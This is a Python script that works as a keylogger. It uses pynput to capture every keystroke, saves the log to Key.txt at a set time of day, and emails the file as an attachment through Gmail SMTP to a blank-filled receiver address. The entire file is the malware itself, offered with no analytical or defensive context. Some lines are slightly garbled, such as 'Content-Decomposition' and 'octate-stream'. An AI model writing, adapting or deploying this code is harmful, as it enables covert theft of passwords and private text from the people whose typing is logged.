from datetime import datetime
from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


Words = list()

while True:
    if datetime.now().strftime('%H-%M') != "21-50":
        try:
            with keyboard.Events() as events:
                for event in events:
                    if str(event) == "Press(key=Key.space)":
                        Words.append(" ")
                    if str(event) == "Press(key=Key.enter)":
                        Words.append("\n")
                    if str(event) == "Press(key=Key.backspace)":
                        Words.pop()
                    if event.key == keyboard.Key.shift_l or event.key == keyboard.Key.shift_r:
                        pass
                    else:
                        new_event = str(event)
                        if new_event.split("'")[0] != "Press(key=":
                            new_event = new_event.split("'")[1]
                            Words.append(new_event)
        except IndexError:
            pass
        except KeyboardInterrupt:
            break
    else:
        with open("Key.txt","w") as f:
            listToStr = ' '.join([str(elem) for elem in Words])
            f.write(listToStr)

        mail_content = '''Hello,
        This is a test mail.
        '''
        #The mail addresses and password
        sender_address = '@gmail.com'
        sender_pass = ''
        receiver_address = '@gmail.com'
        #Setup the MIME
        message = MIMEMultipart()
        message['From'] = sender_address
        message['To'] = receiver_address
        message['Subject'] = 'A test mail sent by Python. It has an attachment.'
        #The subject line
        #The body and the attachments for the mail
        message.attach(MIMEText(mail_content, 'plain'))
        attach_file_name = 'Key.txt'
        attach_file = open(attach_file_name, 'rb') # Open the images as binary mode
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload) #encode the attachment
        #add payload header with filename
        payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
        message.attach(payload)
        #Create SMTP session for sending the mail
        session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
        session.starttls() #enable security
        session.login(sender_address, sender_pass) #login with mail_id and password
        text = message.as_string()
        session.sendmail(sender_address, receiver_address, text)
        session.quit()
